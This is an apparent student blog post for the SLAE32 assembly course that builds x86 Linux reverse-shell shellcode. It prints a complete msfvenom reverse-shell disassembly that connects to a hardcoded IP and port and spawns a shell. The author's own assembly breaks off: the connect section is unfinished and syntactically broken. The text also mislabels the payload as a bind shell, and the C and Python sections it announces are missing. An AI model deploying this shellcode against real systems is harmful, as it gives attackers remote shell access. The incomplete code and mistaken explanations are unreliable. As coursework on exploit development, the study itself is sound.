---
title: "SLAE32 0x02: Shell_Reverse_TCP Shellcode"
date: 2019-10-25
category: [SLAE32]
tags: [assembly, c, python, exploit development, reverse shell, linux, SLAE32]
header:
    teaser: "/assets/images/slae/rev_shell.jpg"
---
In contrast to a bind shell (which is explained in the previous post), a reverse shell is a type of shell in which the system on which the code is run connects a TCP socket to a remote IP address and port that have been designated to listen for incoming connections prior to the execution of the reverse shell. In other words, when a reverse shell is used, the system on which the reverse shell is executed acts as the system that initiates the connection while the remote system acts as the listener. Upon succesful connection to the remote system, a shell will be spawned on the system on which the code is run.

As previously demonstrated, it is wise to begin by analyzing the code of a TCP reverse shell written using a higher level language. The C program shown in the upcoming section will be used for this purpose. It is worth nothing here that there are many similarities in code between the two TCP shell types, so references to the previous post will be common, and some previous explanations may be reused. The focus will lie on the major differences in code between the TCP bind shell and the TCP reverse shell.

Once analysis of the C program is complete, the program will be re-written using assembly. This processes is documented and explained in detail following the C code analysis.

The third section will demonstrate a program written in Python that allows a user to configure an IP address and port number to be used in the Shell_Reverse_TCP shellcode.

## Objectives
Create a Shell_Reverse_TCP shellcode that;
1. Connects to an easily configurable IP address and port number
2. Executes a shell on a successful connection

### Create a TCP Socket
`int socket(int domain, int type, int protocol);`

### Connect TCP Socket to IP Socket Address Structure
`int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

### Direct Connection Socket Output
`int dup2(int oldfd, int newfd);`

### Execute Program
`int execve(const char *pathname, char *const argv[], char *const envp[]);`

## MSFVenom Shellcode Under the Microscope
We can analyze what a bind or reverse shell would look like by looking at the C function calls. In this case, I thought it would be fun to see what 
msfvenom was doing and to my surprise, I found an interesting artifact while comparing code snippets to my dissassembly. The major difference is that 
in most C code segments that I found, dup2 was being called after `connect`. The syscall order (which may not matter entirely, I don't know yet), 
is `socket`, `dup2`, `connect`, and `execve`. The `dup2` and `connect` may be swappable however, I will stick to the same order that msfvenom uses for consistency.

### Referencing MSF Goodies

```msfvenom -p linux/x86/shell_reverse_tcp -f raw| ndisasm -u -``` produces a bind shell payload the size of 68 bytes for us to compare to our generated shellcode.

```nasm
xor ebx,ebx  
mul ebx  
push ebx  
inc ebx     ; EBX=1 is socket
push ebx  
push byte +0x2 
mov ecx,esp  
mov al,0x66 ; socketcall syscall 
int 0x80    ; interrupt
xchg eax,ebx  
pop ecx  
mov al,0x3f ; dup2
int 0x80    ; interrupt
dec ecx  
jns 0x11  
push dword 0x80fea8c0 
push dword 0x5c110002 
mov ecx,esp  
mov al,0x66 ; socketcall syscall wrapper 
push eax  
push ecx  
push ebx  
mov bl,0x3  ; EBX=3 is connect
mov ecx,esp  
int 0x80    ; interrupt
push edx  
push dword 0x68732f6e 
push dword 0x69622f2f 
mov ebx,esp  
push edx  
push ebx  
mov ecx,esp  
mov al,0xb  ; execve
int 0x80    ; interrupt
```
## Building a Reverse TCP Shell
In this excercise, we will build a bind tcp shell using 4 syscalls. In the previous bind shell blog, 
I called each syscall directly using their hexidecimal referrence rather than using the socketcall wrapper. 
In this exersize, I will use socketcall where possible to learn the difference in usage. According to `man socketcall`, 
we will be using socket call to wrap the `socket` and `connect` syscalls. `dup2` and `execve` will not be wrapped.

### Socketcall System Call Explained

Conveniently, two of the four functions from the list above are all accessible via the socketcall system call. As detailed in man socketcall, the function expects two arguments.

```
#include <linux/net.h>
int socketcall(int call, unsigned long *args);  
```
The call argument determines which socket function to use, and the args argument is a pointer to an area of memory that contains the arguments for the socket function specified by call. For a list of socket functions and their respective values that are passable as the call argument to socketcall, the /usr/include/linux/net.h file should be referenced. The available functions for socketcall are shown below.

```
root@kali:~/workspace/SLAE# grep SYS /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */
...
```

### Socket

```nasm
global _start	; Standard start
		;
section .text	;
_start:		;

xor ebx, ebx	; Zero out registers before usage to avoid a logic error
xor ecx, ecx	;
mul cx		; ax = ax * cx (0)

;int socketcall(int call, unsigned long *args)
;*args: (int domain, int type, int protocol) 
;syscall number: 102 (0x66)
;
;Arguement Values:
;EAX -> socketcall sycall 0x66
;EBX -> int call 0x1 = sys_socket
;ECX -> ESP pointer
;STACK *args Values:
;3rd push -> domain = 2 (AF_INET/IPv4)
;2nd push -> type = 1 (SOCK_STREAM/TCP)
;1st push -> protocol = 0 (IPPROTO_TCP)
;

push ebx	; push 0x0
push 0x1	; 1 = SOCK_STREAM
push 0x2	; 2 = AF_INET
mov al, 0x66	; socketcall syscall
mov bl, 0x1	; sys_socket = 1
mov ecx, esp	; *args pointer
int 0x80	; interrupt
```

## Dup2
We can reuse the `dup2` code from our bind shell because all were doing is redirecting stdin, stdout, and stderr.

```nasm
;int dup2(int oldfd, int newfd)
;
;syscall number: 63 (0x3F)
;Arguement Values
;oldfd = previous sockfd value returned by socket
;newfd = 0, 1, 2 iteratively (stdin, stdout, stderr)

xchg ebx, eax	; swap oldfd into ebx (should be 0x3)
pop ecx		; pop 0x2 from socket call into ecx

sockfd_func:	; create a function to reproduce the same actions
mov al, 0x3F	; dup2 call
int 0x80	; interrupt
dec cl		; decrement ecx to 2 then 1 then 0
jnz sockfd_func ; loop back to sockfd_func if not zero
```

## Connect

```nasm
;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
;
;syscall number: 102 (0x66) 
;Arguement Values
;EAX -> 0x66 socketcall
;EBX -> ESP pointer *args
;ECX -> Addrlen
;STACK *args Values:
;3rd push -> 
;

mov al 0x66	; socketcall wrapper
mov ebx, esp	; move *args to ebp
mov ecx,  	; 

```

_This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_

<http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert>

_Student ID: SLAE-1469_

